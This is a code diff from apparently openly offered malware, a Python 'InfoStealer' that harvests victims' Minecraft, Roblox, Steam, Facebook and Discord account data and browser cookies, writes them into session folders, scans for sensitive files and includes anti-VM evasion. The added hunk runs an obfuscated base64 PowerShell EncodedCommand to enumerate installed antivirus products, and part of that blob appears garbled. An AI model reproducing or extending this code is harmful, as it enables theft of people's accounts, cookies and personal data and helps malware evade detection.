+                                    text = f"Minecraft Account\n\nSkins Links: \"https://crafatar.com/skins/{profile['id']}.png\"\nCapes Links: \"https://s.optifine.net/capes/{profile['name']}.png\"\n\nAccount ID: {accountId}\nUsername: {profile['name']}\nEmail: {emails or 'None'}\nMinecraft UID: {profile['id']}\nFriends Count: {count or 0}\nFriends List: {', '.join(name) or 'None'}\nHypixel Rank: {hypixel_data.get('achievementPoints', 'None')}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                                     ListFonction.MinecraftAccount.append(f"{text}\n")
                     except Exception as error:
                         logs_handler(f"Error processing file {mc_file}: {str(error)}")  
@@ -2203,7 +2384,7 @@ asyncio.run(main())
             builder_club = '✅' if base_info["IsAnyBuildersClubMember"] else '❌'
             banned = '✅' if advanced_info["IsBanned"] else '❌'
 
-            ListFonction.RobloxAccounts.append(f"Browser: {browser}\nBrowser Cookie: {browsercookies}\nCookie: {cookie}\nUser: {base_info['UserName']} ({base_info['UserID']})\nThumbnail: {base_info['ThumbnailUrl']}\nRobux: {base_info['RobuxBalance']}\nPremium: {premium}\nBuilder Club: {builder_club}\nCreation Date: {advanced_info['CreationDate']} / {days_passed} Days!\nDescription: {advanced_info['Description']}\nBanned: {banned}\nRAP: {rap}\nFriends List: {friend_list}\n====================================================================================\n")
+            ListFonction.RobloxAccounts.append(f"Browser: {browser}\nBrowser Cookie: {browsercookies}\nCookie: {cookie}\nUser: {base_info['UserName']} ({base_info['UserID']})\nThumbnail: {base_info['ThumbnailUrl']}\nRobux: {base_info['RobuxBalance']}\nPremium: {premium}\nBuilder Club: {builder_club}\nCreation Date: {advanced_info['CreationDate']} / {days_passed} Days!\nDescription: {advanced_info['Description']}\nBanned: {banned}\nRAP: {rap}\nFriends List: {friend_list}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 
         try:
             cookie = await StealCookie()
@@ -2374,12 +2555,20 @@ asyncio.run(main())
                 with open(os.path.join(filePath, "Computer", "network_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     for value in ListFonction.Network:
                         file.write(value)
+            if ListFonction.AntiViruses:
+                with open(os.path.join(filePath, "Computer", "anti_viruses.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    for value in ListFonction.AntiViruses:
+                        file.write(value)
 
 
 
             if ListFonction.SteamUserAccounts:
                 with open(os.path.join(filePath, "Sessions", "steam_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     for value in ListFonction.SteamUserAccounts:
+                        file.write(value)
+            if ListFonction.FacebookAccounts:
+                with open(os.path.join(filePath, "Sessions", "facebook_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    for value in ListFonction.FacebookAccounts:
                         file.write(value)
             if ListFonction.DiscordAccounts:
                 with open(os.path.join(filePath, "Sessions", "discord_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
@@ -2818,6 +3007,20 @@ class InfoStealer:
             logs_handler(f"[ERROR] - getting system informations: {str(Error)}")
             pass
 
+    async def StealAntiViruses(self) -> None:
+        encoded_script = "CgBmAHUAbgBjAHQAaQBvAG4AIABHAGUAdAAtAEEAbgB0AGkAVgBpAHIAdQBzAFAAcgBvAGQAdQBjAHQAIAB7AAoAIAAgACAAIABbAEMAbQBkAGwAZQB0AEIAaQBuAGQAaQBuAGcAKAApAF0ACgAgACAAIAAgAHAAYQByAGEAbQAgACgACgAgACAAIAAgACAAIAAgACAAWwBBAGwAaQBhAHMAKAAnAG4AYQBtAGUAJwApAF0ACgAgACAAIAAgACAAIAAgACAAJABjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQA9ACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQAKACAAIAAgACAAKQAKAAoAIAAgACAAIAAkAEEAbgB0AGkAVgBpAHIAdQBzAFAAcgBvAGQAdQBjAHQAcwAgAD0AIABHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAALQBOAGEAbQBlAHMAcABhAGMAZQAgACIAcgBvAG8AdABcAFMAZQBjAHUAcgBpAHQAeQBDAGUAbgB0AGUAcgAyACIAIAAtAEMAbABhAHMAcwAgAEEAbgB0AGkAVgBpAHIAdQBzAFAAcgBvAGQAdQBjAHQAIAAtAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAAJABjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQAKACAAIAAgACAAJAByAGUAdAAgAD0AIABAACgAKQAKACAAIAAgACAACgAgACAAIAAgAGYAbwByAGUAYQBjAGgAIAAoACQAQQBuAHQAaQBWAGkAcgB1AHMAUAByAG8AZAB1AGMAdAAgAGkAbgAgACQAQQBuAHQAaQBWAGkAcgB1AHMAUAByAG8AZAB1AGMAdABzACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAZABlAGYAcwB0AGEAdAB1AHMAIAA9ACAAIgBVAG4AawBuAG8AdwBuACIACgAgACAAIAAgACAAIAAgACAAJAByAHQAcwB0AGEAdAB1AHMAIAA9ACAAIgBVAG4AawBuAG8AdwBuACIACgAgACAAIAAgACAAIAAgACAACgAgACAAIAAgACAAIAAgACAAcwB3AGkAdABjAGgAIAAoACQAQQBuAHQAaQBWAGkAcgB1AHMAUAByAG8AZAB1AGMAdAAuAHAAcgBvAGQAdQBjAHQAUwB0AGEAdABlACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIgAyADYAMgAxADQANAAiACAAewAgACQAZABlAGYAcwB0AGEAdAB1AHMAIAA9ACAAIgBVAHAAIAB0AG8AIABkAGEAdABlACIAOwAgACQAcgB0AHMAdABhAHQAdQBzACAAPQAgACIARABpAHMAYQBiAGwAZQBkACIAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIgAyADYANgAyADQAMAAiACAAewAgACQAZABlAGYAcwB0AGEAdAB1AHMAIAA9ACAAIgBVAHAAIAB0AG8AIABkAGEAdABlACIAOwAgACQAcgB0AHMAdABhAHQAdQBzACAAPQAgACIARQBuAGEAYgBsAGUAZAAiACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACIAMwA5ADMAMgAxADYAIgAgAHsAIAAkAGQAZQBmAHMAdABhAHQAdQBzACAAPQAgACIAVQBwACAAdABvACAAZABhAHQAZQAiADsAIAAkAHIAdABzAHQAYQB0AHUAcwAgAD0AIAAiAEQAaQBzAGEAYgBsAGUAZAAiACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACIAMwA5ADcAMwAxADIAIgAgAHsAIAAkAGQAZQBmAHMAdABhAHQAdQBzACAAPQAgACIAVQBwACAAdABvACAAZABhAHQAZQAiADsAIAAkAHIAdABzAHQAYQB0AHUAcwAgAD0AIAAiAEUAbgBhAGIAbABlAGQAIgAgAH0ACgAgACAAIAAgACAAIAAgACAAfQAKAAoAIAAgACAAIAAgACAAIAAgACQAaAB0ACAAPQAgAFsAUABTAEMAdQBzAHQAbwBtAE8AYgBqAGUAYwB0AF0AQAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQwBvAG0AcAB1AHQAZQByAG4AYQBtAGUAIAA9ACAAJABjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE4AYQBtAGUAIAA9ACAAJABBAG4AdABpAFYAaQByAHUAcwBQAHIAbwBkAHUAYwB0AC4AZABpAHMAcABsAGEAeQBOAGEAbQBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwBQAHIAbwBkAHUAYwB0ACAARwBVAEkARAAnACAAPQAgACQAQQBuAHQAaQBWAGkAcgB1AHMAUAByAG8AZAB1B1AGMAdAAuAGkAbgBzAHQAYQBuAGMAZQBHAHUAaQBkAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwBQAHIAbwBkAHUAYwB0ACAARQB4AGUAYwB1AHQAYQBiAGwAZQAnACAAPQAgACQAQQBuAHQAaQBWAGkAcgB1AHMAUAByAG8AZAB1AGMAdAAuAHAAYQB0AGgAVABvAFMAaQBnAG4AZQBkAFAAcgBvAGQAdQBjAHQARQB4AGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnAFIAZQBwAG8AcgB0AGkAbgBnACAARQB4AGUAJwAgAD0AIAAkAEEAbgB0AGkAVgBpAHIAdQBzAFAAcgBvAGQAdQBjAHQALgBwAGEAdABoAFQAbwBTAGkAZwBuAGUAZABSAGUAcABvAHIAdABpAG4AZwBFAHgAZQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcARABlAGYAaQBuAGkAdABpAG8AbgAgAFMAdABhAHQAdQBzACcAIAA9ACAAJABkAGUAZgBzAHQAYQB0AHUAcwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAUgBlAGEAbAAtAHQAaQBtAGUAIABQAHIAbwB0AGUAYwB0AGkAbwBuACAAUwB0AGEAdAB1AHMAJwAgAD0AIAAkAHIAdABzAHQAYQB0AHUAcwAKACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHQAIAArAD0AIAAkAGgAdAAKACAAIAAgACAAfQAKACAAIAAgACAAUgBlAHQAdQByAG4AIAAkAHIAZQB0AAoAfQAKAEcAZQB0AC0AQQBuAHQAaQBWAGkAcgB1AHMAUAByAG8AZAB1AGMAdAAKAA=="
+        command = f"powershell -EncodedCommand {encoded_script}"
+        try:
+            process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+            stdout, stderr = await process.communicate()
+            if process.returncode == 0:
+                antivirus_info = stdout.decode().strip()
+                ListFonction.AntiViruses.append(antivirus_info)
+            else:
+                pass
+        except Exception as e:
+            logs_handler(f"Error getting antivirus information: {str(e)}")
+
 class anti_vm:
     async def run_all_fonctions(self) -> None:
         tasks = [
@@ -2925,10 +3128,6 @@ if __name__ == '__main__':
         main = get_data()
         asyncio.run(main.RunAllFonctions())
 
-        files = StealFiles()
-        asyncio.run(files.check_sensitive_files())
-    else:
-        print("run only on windows operating system")
         files = StealFiles()
         asyncio.run(files.check_sensitive_files())
     else:
